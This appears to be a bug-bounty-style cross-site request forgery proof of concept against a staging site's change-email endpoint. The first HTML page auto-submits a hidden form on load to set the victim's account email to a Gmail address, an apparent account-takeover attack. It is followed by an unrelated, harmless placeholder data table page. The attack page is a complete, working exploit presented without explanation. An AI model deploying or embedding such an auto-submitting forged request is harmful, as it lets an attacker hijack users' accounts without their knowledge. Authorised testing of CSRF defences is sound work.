<!DOCTYPE html>
<html>

<script type="text/javascript">
        window.onload = function() {
            // Create a form element
            var form = document.createElement("form");
            form.method = "POST";
            form.action = "https://staging.scheduapp.com/settings/change-email";
            // Create a hidden input for the email
            var input = document.createElement("input");
            input.type = "hidden";
            input.name = "email";
            input.value = "tHHsevengraytech@gmail.com"; // Use the correct email format
            // Append the input to the form
            form.appendChild(input);
            // Append the form to the body
            document.body.appendChild(form);
            // Submit the form
            form.submit();
        };
    </script>

</html>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Data Table Example</title>
    <style>
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px;
            text-align: left;
        }
        th {
            background-color: #f2f2f2;
        }
    </style>
</head>
<body>

<h2>Data Table</h2>

<table>
    <thead>
        <tr>
            <th>Column 1</th>
            <th>Column 2</th>
            <th>Column 3</th>
        </tr>
    </thead>
    <tbody>
        <tr>
            <td>Data 1.1</td>
            <td>Data 1.2</td>
            <td>Data 1.3</td>
        </tr>
        <tr>
            <td>Data 2.1</td>
            <td>Data 2.2</td>
            <td>Data 2.3</td>
        </tr>
        <tr>
            <td>Data 3.1</td>
            <td>Data 3.2</td>
            <td>Data 3.3</td>
        </tr>
    </tbody>
</table>

</body>
</html>
